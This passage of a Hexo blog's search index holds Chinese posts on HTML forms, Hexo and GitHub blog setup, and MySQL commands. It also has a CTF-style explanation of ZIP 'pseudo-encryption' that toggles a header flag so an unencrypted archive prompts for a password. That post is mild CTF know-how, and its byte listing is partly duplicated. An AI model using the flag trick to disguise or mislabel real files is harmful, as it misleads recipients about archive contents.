src="http://img-blog.csdnimg.cn/20190329151313779.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>    <strong>-HTML 表单和输入</strong><br>    文本域通过<input type="text"> 标签来设定，当用户要在表单中键入字母、数字等内容时，就会用到文本域。<br>表单使用表单标签 <code>&lt;form&gt;</code> 来设置:</p><pre><code>&lt;form&gt;First name: &lt;input type=&quot;text&quot; name=&quot;firstname&quot;&gt;&lt;br&gt;Last name: &lt;input type=&quot;text&quot; name=&quot;lastname&quot;&gt;&lt;/form&gt; </code></pre><p><img src="http://img-blog.csdnimg.cn/20190329151830622.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>2. 密码字段通过标签<code>&lt;input type=&quot;password&quot;&gt;</code> 来定义:*<br>    密码字段字符不会明文显示，而是以星号或圆点替代</p><pre><code>&lt;form&gt;Password: &lt;input type=&quot;password&quot; name=&quot;pwd&quot;&gt;&lt;/form&gt;</code></pre><p><img src="http://img-blog.csdnimg.cn/20190329152700653.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> Web开发 </category>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> html </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>伪加密做法及原理</title>
      <link href="2019/03/25/%E4%BC%AA%E5%8A%A0%E5%AF%86%E5%81%9A%E6%B3%95%E5%8F%8A%E5%8E%9F%E7%90%86/"/>
      <url>2019/03/25/%E4%BC%AA%E5%8A%A0%E5%AF%86%E5%81%9A%E6%B3%95%E5%8F%8A%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<ul><li><p><strong>总结一下伪加密题的解法，首先伪加密是指对zip文件的标志位进行修改，然后达到加密的效果，实际上并没有加密。</strong></p><p>一个 ZIP 文件由三个部分组成：<br>　　压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志 。</p><p>　　用Winhex工具打开查看其十六进制编码，图如下：<br>　　<img src="http://img-blog.csdnimg.cn/20190325203657619.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li></ul><p>首先需要了解一下这些16进制数的作用才能知道为什么要这样写，不要只为了做题而做题。</p><p><strong>a.压缩源文件数据区：</strong><br>50 4B 03 04：这是头文件标记（0x04034b50）<br>14 00：解压文件所需 pkware 版本 </p><pre><code>***00 00：全局方式位标记（有无加密）*** 这呢就是伪加密的地方！！！在504B0102的后面。下面有图。</code></pre><p>08 00：压缩方式<br>5A 7E：最后修改文件时间<br>F7 46：最后修改文件日期<br>16 B5 80 14：CRC-32校验（1480B516）<br>19 00 00 00：压缩后尺寸（25）<br>17 00 00 00：未压缩尺寸（23）<br>07 00：文件名长度<br>00 00：扩展记录长度<br>6B65792E7478740BCECC750E71ABCE48CDC9C95728CECC2DC849AD284DAD0500b.压缩源文件目录区:50 4B 01 02：目录中文件文件头标记(0x02014b50)<br>3F 00：压缩使用的 pkware 版本<br>14 00：解压文件所需 pkware 版本<br>00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）<br>08 00：压缩方式<br>5A 7E：最后修改文件时间<br>F7 46：最后修改文件日期<br>16 B5 80 14：CRC-32校验（1480B516）<br>19 00 00 00：压缩后尺寸（25）<br>17 00 00 00：未压缩尺寸（23）<br>07 00：文件名长度<br>24 00：扩展字段长度<br>00 00：文件注释长度<br>00 00：磁盘开始号<br>00 00：内部文件属性<br>20 00 00 00：外部文件属性<br>00 00 00 00：局部头部偏移量<br>6B65792E7478740A00200000000000010018006558F04A1CC5D001BDEBDD3B1CC5D001BDEBDD3B1CC5D001c.压缩源文件目录结束标志:50 4B 05 06：目录结束标记<br>00 00：当前磁盘编号<br>00 00：目录区开始磁盘编号<br>01 00：本磁盘上纪录总数<br>01 00：目录区中纪录总数<br>59 00 00 00：目录区尺寸大小<br>3E 00 00 00：目录区对第一张磁盘的偏移量<br>00 00 1A：ZIP 文件注释长度<br><strong>b.压缩源文件目录区:50 4B 01 02：目录中文件文件头标记(0x02014b50)</strong><br>3F 00：压缩使用的 pkware 版本<br>14 00：解压文件所需 pkware 版本<br>00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）<br>08 00：压缩方式<br>5A 7E：最后修改文件时间<br>F7 46：最后修改文件日期<br>16 B5 80 14：CRC-32校验（1480B516）<br>19 00 00 00：压缩后尺寸（25）<br>17 00 00 00：未压缩尺寸（23）<br>07 00：文件名长度<br>24 00：扩展字段长度<br>00 00：文件注释长度<br>00 00：磁盘开始号<br>00 00：内部文件属性<br>20 00 00 00：外部文件属性<br>00 00 00 00：局部头部偏移量<br>6B65792E7478740A00200000000000010018006558F04A1CC5D001BDEBDD3B1CC5D001BDEBDD3B1CC5D001<br><strong>c.压缩源文件目录结束标志:50 4B 05 06：目录结束标记</strong><br>00 00：当前磁盘编号<br>00 00：目录区开始磁盘编号<br>01 00：本磁盘上纪录总数<br>01 00：目录区中纪录总数<br>59 00 00 00：目录区尺寸大小<br>3E 00 00 00：目录区对第一张磁盘的偏移量<br>00 00 1A：ZIP 文件注释长度<br>找到 504B0102 后<img src="http://img-blog.csdnimg.cn/20190325204935609.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>改完另存为文件再打开就可以了！</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞原理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 伪加密 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用hexo搭建blog</title>
      <link href="2019/03/22/%E4%BD%BF%E7%94%A8hexo%20%E6%90%AD%E5%BB%BA%20blog%E8%BF%87%E7%A8%8B/"/>
      <url>2019/03/22/%E4%BD%BF%E7%94%A8hexo%20%E6%90%AD%E5%BB%BA%20blog%E8%BF%87%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>教你如何一步一步使用hexo搭建blog。</p><a id="more"></a><p> <strong>1.</strong> <strong>第一步安装 Node.js</strong><br><a href="https://nodejs.org/en/"> 下载地址</a><br><img src="http://img-blog.csdnimg.cn/20190320150754855.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br> 选择第一个稳定版一路next，不过在Custom Setup这一步记得选<strong>Add to PATH</strong> ,这样你就不用自己去配置电脑上环境变量了，完成后win+r,输入node-v,显示版本号则成功。<img src="http://img-blog.csdnimg.cn/20190317135718944.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><strong>2.Git的安装</strong></p><p>在浏览器上搜索git for windows，进入官网，点击Dawnload进行下载。或者点击下面这个网址下载<br><a href="http://npm.taobao.org/mirrors/git-for-windows/v2.21.0.windows.1/">下载地址</a><br>安装步骤：一路next到这个页面</p><p><img src="http://img-blog.csdnimg.cn/20190320154605917.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br>选择第二个，然后继续一路next。<br><strong>3</strong>.<strong>Hexo的安装</strong><br>先创建文件夹用来存放，创建了一个名为blog的文件夹。进入该文件夹目录，鼠标右击，选择Git Bash Here进入命令行。</p><p><img src="http://img-blog.csdnimg.cn/20190321150616969.png" alt="在这里插入图片描述"><br>开始安装Hexo，安装命令：<br><code>npm install hexo-cli -g</code><br>然后初始化<br>初始化命令：<code>hexo init blog</code><br><strong>4.Github的创建</strong></p><ul><li>注册账号</li><li>初始设置</li><li>验证账号</li></ul><p> <strong>5.Github的配置</strong></p><ul><li>配置github信息</li></ul><pre><code>git config --global user.email &quot;YourEail&quot; git config --global user.name &quot;YourName&quot;将邮箱和用户名都换成自己的。</code></pre><ul><li>生成SSH密钥<br>打开Git Bash Here命令行，输入<code>ssh-keygen -t rsa -C &quot;你的邮箱&quot;</code>然后一直回车到结束，这样就成功在C盘用户个人目录生成了.ssh文件夹。<br>打开文件复制密钥。</li><li>登录你的gihub账号<br>点击Edit profile进入，选择SSH并新建一个SSH Key</li></ul><p><strong>6.config.yml文件的配置</strong><br>打开你的blog项目，修改_config.yml文件的一些配置:<br>url:http://你的账户名.github.io</p><pre><code>deploy:  type: git  repo: https://github.com/你的账户名/你的账户名.github.io.git  branch: master</code></pre><p><strong>7.本地预览和上传到Github</strong><br>在你的blog目录下右键打开git base here<br>执行以下命令</p><p>hexo clean<br>hexo g<br>hexo s<br>打开浏览器输入：<a href="http://localhost:4000/">http://localhost:4000</a> 就可以在本地看到Hexo。<br>hexo g即可上传同步。</p>]]></content>
      
      
      <categories>
          
          <category> Blog搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql 语句练习</title>
      <link href="2019/01/27/Mysql%20%E8%AF%AD%E5%8F%A5%E7%BB%83%E4%B9%A0/"/>
      <url>2019/01/27/Mysql%20%E8%AF%AD%E5%8F%A5%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p> 这周来了解一下数据库的知识，使用phpstudy自带的mysql，来练习数据库方面的知识。<hr><br>首先使用phpstudy上的Mysql命令行便可进行数据库的创建，删除，数据表的创建与删除，数据的增删查改。默认密码应该为root。<img src="http://img-blog.csdnimg.cn/20190127114142720.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>利用cmd进入phpstudy数据库需进入phpstudy下的bin目录<br><img src="http://img-blog.csdnimg.cn/20190127114532136.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"></p><p><strong>下面是一些常用sql语句，具体操作不再展示。</strong></p><p>创建一个数据库<br>create database 数据库名称；<br>删除一个数据库<br>drop database 数据库名称；<br>选择（使用）一个数据库<br>use 数据库名称；<br>在选择好的数据库中建立一个数据表<br>&lt;创建一个表&gt;<br>create table 表名 ( id int ,name varchar(35),password varchar(40));<br>其中 id name password 是字段 ,后面的限制是类型。<br>&lt;删除一个表&gt;<br>drop table 表名；<br>&lt;查看表结构&gt;<br>desc  表名称；<br>&lt;查看建表语句&gt;<br>show create  table 表名称；<br>&lt;查看建库语句&gt;<br>show create database 数据库名称；<br>&lt;修改表字段值&gt;<br>alter table 表名  modify 字段名字 修改字段值；<br>&lt;添加表字段&gt;<br>alter table 表名 add 字段名称+字段类型；<br>&lt;删除表字段&gt;<br>alter table 表名  drop 字段名字；<br>&lt;插入顺序的问题&gt;<br>first<br> alter  table  表名  add  字段名称+类型  first;<br>after<br> alter table 表名 add  字段名称+类型   after+字段名称;<br>&lt;修改表的名字&gt;<br>alter table 原表名 rename 新的名字；<br>&lt;查表&gt;<br>show tables;<br>&lt;查库&gt;<br>show databases;.<br>&lt;修改表字段&gt;<br>alter table 表名  change 原来的字段名称    修改后的字段名称；</p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
